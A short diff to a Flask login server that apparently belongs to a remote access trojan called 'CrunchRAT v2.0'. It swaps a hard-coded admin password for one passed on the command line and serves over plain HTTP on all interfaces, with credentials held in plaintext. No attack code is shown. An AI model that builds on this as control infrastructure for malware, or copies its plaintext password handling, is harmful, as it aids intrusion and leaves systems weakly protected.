@@ -1,6 +1,4 @@
-# Working authentication code
 # Source: https://github.com/maxcountryman/flask-login
-
 import argparse
 import os
 from flask import Flask
@@ -23,8 +21,6 @@ app.config["SECRET_KEY"] = os.urandom(32)
 login_manager = LoginManager()
 login_manager.init_app(app)
 
-# Our mock database.
-users = {'admin': {'pw': 'secret'}}
 
 class User(UserMixin):
     pass
@@ -91,7 +87,21 @@ def logout():
 def unauthorized_handler():
     return 'Unauthorized'
 
+
 if __name__ == "__main__":
+    parser = argparse.ArgumentParser(prog="server.py",
+                                     description="CrunchRAT v2.0")
+    parser.add_argument("password",
+                        action="store",
+                        type=str,
+                        help="server password")
+
+    # parses provided arguments
+    args = parser.parse_args()
+
+    # authentication credentials - DEBUGGING
+    users = {'admin': {'pw': args.password}}
+
     # starts Flask listener
     server = WSGIServer(("0.0.0.0", 80), app)
     server.serve_forever()
